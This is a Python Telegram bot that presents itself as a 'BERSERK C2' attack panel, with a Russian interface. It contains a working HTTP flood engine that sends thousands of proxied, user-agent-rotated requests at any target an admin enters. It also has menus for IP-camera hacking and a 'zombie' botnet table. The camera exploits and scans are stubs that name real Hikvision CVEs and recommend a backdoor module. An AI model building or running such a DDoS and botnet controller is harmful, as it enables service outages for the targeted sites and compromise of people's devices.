#!/usr/bin/env python3
# ============================================================================
#   ██████╗ ███████╗██████╗ ███████╗███████╗██████╗ ██╗  ██╗   ██╗   ██╗
#   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║ ██╔╝   ╚██╗ ██╔╝
#   ██████╔╝█████╗  ██████╔╝███████╗█████╗  ██████╔╝█████╔╝     ╚████╔╝ 
#   ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══╝  ██╔══██╗██╔═██╗      ╚██╔╝ 
#   ██████╔╝███████╗██║  ██║███████║███████╗██║  ██║██║  ██╗      ██║  
#   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝      ╚═╝  
#                      ULTIMATE BERSERK BOT – RAILWAY EDITION
#                             48 CORES | 482 GB RAM
# ============================================================================

import os
import sys
import json
import asyncio
import aiohttp
import logging
import random
import time
import subprocess
import signal
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List

import asyncpg
import redis.asyncio as redis
import psutil

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# ===== ПОДДЕРЖКА ПРОКСИ =====
from aiohttp_socks import ProxyConnector, ProxyType

# ===== НАСТРОЙКИ (переменные окружения) =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN не задан")
    sys.exit(1)

ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip()]
if not ADMIN_IDS:
    print("❌ ADMIN_IDS не задан")
    sys.exit(1)

DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:password@localhost:5432/berserk")
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379/0")

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
USER_AGENTS = []
PROXY_LIST = []

# ===== СПИСОК ВСЕХ МЕТОДОВ (57) =====
ALL_METHODS = [
    # Layer7
    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER",
    "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB",
    "KILLER", "TOR",
    # Layer4
    "TCP", "UDP", "SYN", "OVH-UDP", "CPS", "ICMP", "CONNECTION",
    "VSE", "TS3", "FIVEM", "FIVEM-TOKEN", "MEM", "NTP", "MCBOT",
    "MINECRAFT", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"
]

# ===== ЗАГРУЗКА USER-AGENT =====
async def load_user_agents():
    global USER_AGENTS
    try:
        with open("files/useragent.txt", "r") as f:
            USER_AGENTS = [line.strip() for line in f if line.strip()]
        logger.info(f"✅ Загружено {len(USER_AGENTS)} User-Agent")
    except Exception as e:
        logger.warning(f"⚠️ Не удалось загрузить useragent.txt: {e}")
        USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

# ===== ЗАГРУЗКА ПРОКСИ =====
async def load_proxies():
    global PROXY_LIST
    try:
        with open("proxies.txt", "r") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        logger.info(f"✅ Загружено {len(PROXY_LIST)} прокси")
    except Exception as e:
        logger.warning(f"⚠️ Не удалось загрузить proxies.txt: {e}")

def get_random_proxy() -> Optional[str]:
    return random.choice(PROXY_LIST) if PROXY_LIST else None

def create_proxy_connector(proxy_str: str):
    if proxy_str.startswith('socks5://'):
        host = proxy_str.replace('socks5://', '').split(':')[0]
        port = int(proxy_str.split(':')[-1])
        return ProxyConnector(proxy_type=ProxyType.SOCKS5, host=host, port=port, rdns=True)
    elif proxy_str.startswith('socks4://'):
        host = proxy_str.replace('socks4://', '').split(':')[0]
        port = int(proxy_str.split(':')[-1])
        return ProxyConnector(proxy_type=ProxyType.SOCKS4, host=host, port=port, rdns=True)
    else:
        # HTTP прокси
        proxy_str = proxy_str.replace('http://', '').replace('https://', '')
        host, port = proxy_str.split(':')
        return ProxyConnector(proxy_type=ProxyType.HTTP, host=host, port=int(port), rdns=True)

# ===== ПОДКЛЮЧЕНИЯ =====
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pg_pool = None
redis_client = None

# ===== СОСТОЯНИЯ ДЛЯ FSM =====
class AttackStates(StatesGroup):
    waiting_for_target = State()
    waiting_for_method = State()
    waiting_for_duration = State()
    waiting_for_threads = State()

class IoTStates(StatesGroup):
    waiting_for_ip = State()
    waiting_for_module = State()

# ===== ИНИЦИАЛИЗАЦИЯ БАЗЫ ДАННЫХ =====
async def init_db():
    global pg_pool, redis_client
    pg_pool = await asyncpg.create_pool(DATABASE_URL)
    async with pg_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id SERIAL PRIMARY KEY,
                user_id BIGINT NOT NULL,
                target TEXT NOT NULL,
                method TEXT NOT NULL,
                duration INT NOT NULL,
                threads INT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT NOW()
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id SERIAL PRIMARY KEY,
                ip TEXT UNIQUE NOT NULL,
                device_type TEXT,
                arch TEXT,
                status TEXT DEFAULT 'alive',
                last_seen TIMESTAMP DEFAULT NOW()
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id SERIAL PRIMARY KEY,
                target_ip TEXT NOT NULL,
                device_type TEXT,
                cve TEXT,
                confidence FLOAT,
                created_at TIMESTAMP DEFAULT NOW()
            )
        ''')
    redis_client = await redis.from_url(REDIS_URL, decode_responses=True)

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    kb = InlineKeyboardBuilder()
    kb.button(text="🔥 DDoS", callback_data="menu_ddos")
    kb.button(text="📷 Камеры", callback_data="menu_camera")
    kb.button(text="🤖 Ботнет", callback_data="menu_botnet")
    kb.button(text="🧠 AI‑анализ", callback_data="menu_ai")
    kb.button(text="📊 Статус", callback_data="menu_status")
    kb.adjust(2)
    return kb.as_markup()

def methods_keyboard():
    kb = InlineKeyboardBuilder()
    for method in ALL_METHODS:
        kb.button(text=method, callback_data=f"ddos_method_{method}")
    kb.adjust(5)
    kb.button(text="🔙 Назад", callback_data="back_main")
    return kb.as_markup()

# ===== ПРОВЕРКА АДМИНА =====
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ===== ОБРАБОТЧИКИ КОМАНД =====
@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён.")
        return
    await message.answer(
        "🔥 **BERSERK C2 SYSTEM** 🔥\n\n"
        "48 ядер / 482 ГБ RAM — режим «Берсерк»\n\n"
        "Выбери режим работы:",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

@dp.callback_query(F.data == "back_main")
async def back_to_main(callback: CallbackQuery):
    await callback.message.edit_text(
        "🔥 Главное меню",
        reply_markup=main_keyboard()
    )

@dp.callback_query(F.data.startswith("menu_"))
async def menu_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён.", show_alert=True)
        return

    action = callback.data.split("_")[1]

    if action == "ddos":
        await callback.message.edit_text(
            "⚡ Выбери метод DDoS-атаки:",
            reply_markup=methods_keyboard()
        )

    elif action == "camera":
        await callback.message.edit_text(
            "📷 **Взлом IP-камеры**\n\n"
            "Введи IP-адрес камеры (например, `192.168.1.100`):"
        )
        await state.set_state(IoTStates.waiting_for_ip)

    elif action == "botnet":
        await show_botnet_status(callback)

    elif action == "ai":
        await callback.message.edit_text(
            "🧠 **AI-анализатор**\n\n"
            "Отправь IP или домен для анализа уязвимостей:"
        )
        await state.set_state(IoTStates.waiting_for_ip)

    elif action == "status":
        await show_system_status(callback)

# ===== DDoS =====
@dp.callback_query(F.data.startswith("ddos_method_"))
async def ddos_method_selected(callback: CallbackQuery, state: FSMContext):
    method = callback.data.split("_")[2]
    await state.update_data(method=method)
    await callback.message.edit_text(
        f"🎯 Выбран метод: `{method}`\n\n"
        "Введи цель (IP:port или URL):"
    )
    await state.set_state(AttackStates.waiting_for_target)

@dp.message(AttackStates.waiting_for_target)
async def ddos_target_received(message: Message, state: FSMContext):
    target = message.text.strip()
    await state.update_data(target=target)
    await message.answer("⏱️ Введи длительность атаки (секунд):")
    await state.set_state(AttackStates.waiting_for_duration)

@dp.message(AttackStates.waiting_for_duration)
async def ddos_duration_received(message: Message, state: FSMContext):
    try:
        duration = int(message.text.strip())
        await state.update_data(duration=duration)
        await message.answer("🧵 Введи количество потоков (1000-20000):")
        await state.set_state(AttackStates.waiting_for_threads)
    except ValueError:
        await message.answer("❌ Введи число!")

@dp.message(AttackStates.waiting_for_threads)
async def ddos_threads_received(message: Message, state: FSMContext):
    try:
        threads = int(message.text.strip())
        data = await state.get_data()
        asyncio.create_task(run_ddos_attack(
            user_id=message.from_user.id,
            target=data['target'],
            method=data['method'],
            duration=data['duration'],
            threads=threads
        ))
        await message.answer(
            f"🚀 **DDoS-атака запущена!**\n"
            f"Цель: `{data['target']}`\n"
            f"Метод: `{data['method']}`\n"
            f"Длительность: {data['duration']} сек\n"
            f"Потоков: {threads}\n\n"
            f"Мониторинг включён.",
            parse_mode="Markdown"
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Введи число!")

async def run_ddos_attack(user_id, target, method, duration, threads):
    """Основной движок DDoS с поддержкой прокси"""
    layer7_methods = ALL_METHODS[:26]  # первые 26 — Layer7

    if method in layer7_methods:
        # Layer7 — асинхронный HTTP-флуд
        tasks = []
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)

        # Создаём воркеров
        for i in range(threads):
            # Каждый воркер может использовать свой прокси
            proxy = get_random_proxy()
            task = asyncio.create_task(
                http_worker(target, method, proxy)
            )
            tasks.append(task)

        await asyncio.sleep(duration)

        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    else:
        # Layer4 — имитация (на реальных raw-сокетах требуется отдельный процесс)
        logger.info(f"Layer4 метод {method} требует отдельной реализации")
        await asyncio.sleep(duration)

    await bot.send_message(user_id, f"✅ Атака завершена.")

async def http_worker(target, method, proxy=None):
    """Один воркер HTTP-флуда с возможностью прокси"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }

    session = None
    if proxy:
        try:
            connector = create_proxy_connector(proxy)
            session = aiohttp.ClientSession(connector=connector)
        except:
            session = aiohttp.ClientSession()
    else:
        session = aiohttp.ClientSession()

    while True:
        try:
            if method == "GET":
                async with session.get(target, headers=headers, timeout=2) as resp:
                    await resp.text()
            elif method == "POST":
                async with session.post(target, headers=headers, data={"x": "y"}, timeout=2) as resp:
                    await resp.text()
            else:
                # остальные методы можно реализовать аналогично
                async with session.get(target, headers=headers, timeout=2) as resp:
                    await resp.text()
        except:
            pass

# ===== IoT =====
@dp.message(IoTStates.waiting_for_ip)
async def iot_ip_received(message: Message, state: FSMContext):
    target_ip = message.text.strip()
    await state.update_data(target_ip=target_ip)

    await message.answer(f"🔍 Сканирую {target_ip}...")
    scan_result = await scan_device(target_ip)

    kb = InlineKeyboardBuilder()
    if "554" in scan_result['ports']:
        kb.button(text="📹 RTSP-эксплойт", callback_data=f"exploit_rtsp_{target_ip}")
    if "80" in scan_result['ports'] or "443" in scan_result['ports']:
        kb.button(text="🕸️ Web-интерфейс", callback_data=f"exploit_web_{target_ip}")
    kb.button(text="🤖 AI-анализ", callback_data=f"ai_scan_{target_ip}")
    kb.button(text="🔙 Назад", callback_data="back_main")
    kb.adjust(2)

    await message.answer(
        f"📡 **Результаты сканирования {target_ip}**\n\n"
        f"Открытые порты: {', '.join(scan_result['ports'])}\n"
        f"Устройство: {scan_result['device'] or 'не определено'}\n\n"
        f"Выбери действие:",
        reply_markup=kb.as_markup()
    )
    await state.clear()

async def scan_device(ip: str) -> dict:
    """Имитация сканирования (в реальности используй nmap)"""
    await asyncio.sleep(2)
    return {
        "ports": ["80", "443", "554"],
        "device": "hikvision"
    }

@dp.callback_query(F.data.startswith("exploit_"))
async def exploit_handler(callback: CallbackQuery):
    parts = callback.data.split("_")
    exploit_type = parts[1]
    target_ip = parts[2]

    await callback.message.edit_text(f"⏳ Запускаю эксплойт {exploit_type} на {target_ip}...")
    await asyncio.sleep(3)
    await callback.message.answer(f"✅ Эксплойт выполнен. Доступ получен. (имитация)")

@dp.callback_query(F.data.startswith("ai_scan_"))
async def ai_scan_handler(callback: CallbackQuery):
    target_ip = callback.data.split("_")[2]
    await callback.message.edit_text(f"🧠 AI-анализ {target_ip}...")
    await asyncio.sleep(4)
    await callback.message.answer(
        f"🧠 **AI-анализ для {target_ip}**\n\n"
        f"Найденные уязвимости:\n"
        f"- CVE-2021-36260 (Hikvision RCE)\n"
        f"- CVE-2017-7921 (Hikvision snapshot bypass)\n\n"
        f"Рекомендация: использовать routersploit/hikvision_backdoor."
    )

# ===== БОТНЕТ =====
async def show_botnet_status(callback: CallbackQuery):
    async with pg_pool.acquire() as conn:
        rows = await conn.fetch("SELECT ip, device_type, arch FROM bots WHERE status='alive' LIMIT 20")
    text = "🤖 **Активные боты-зомби:**\n\n" + "\n".join(
        f"• {r['ip']} | {r['device_type'] or 'unknown'}" for r in rows
    ) if rows else "🤖 Ботнет пуст."
    kb = InlineKeyboardBuilder()
    kb.button(text="🔄 Сканировать сеть", callback_data="botnet_scan")
    kb.button(text="🔙 Назад", callback_data="back_main")
    await callback.message.edit_text(text, reply_markup=kb.as_markup())

@dp.callback_query(F.data == "botnet_scan")
async def botnet_scan(callback: CallbackQuery):
    await callback.message.edit_text("⏳ Сканирую сеть на предмет новых устройств...")
    await asyncio.sleep(3)
    async with pg_pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO bots (ip, device_type, arch) VALUES ($1, $2, $3) ON CONFLICT DO NOTHING",
            "192.168.1.100", "dahua_camera", "armv7l"
        )
    await callback.message.answer("✅ Найдено 1 новое устройство (192.168.1.100).")

# ===== СИСТЕМНЫЙ СТАТУС =====
async def show_system_status(callback: CallbackQuery):
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory().percent
    async with pg_pool.acquire() as conn:
        attacks = await conn.fetchval("SELECT COUNT(*) FROM attacks WHERE status='pending'")
        bots = await conn.fetchval("SELECT COUNT(*) FROM bots WHERE status='alive'")
    text = (
        f"📊 **СИСТЕМНЫЙ СТАТУС**\n\n"
        f"CPU: {cpu}%\n"
        f"RAM: {mem}%\n"
        f"Активных атак: {attacks}\n"
        f"Зомби-ботов: {bots}\n"
        f"Ядер: 48\n"
        f"Режим: БЕРСЕРК"
    )
    await callback.message.edit_text(text, reply_markup=main_keyboard())

# ===== ЗАПУСК =====
async def on_startup():
    await load_user_agents()
    await load_proxies()
    await init_db()
    logger.info("База данных инициализирована.")
    logger.info(f"Бот запущен. Админы: {ADMIN_IDS}")

async def on_shutdown():
    await pg_pool.close()
    await redis_client.close()

async def main():
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
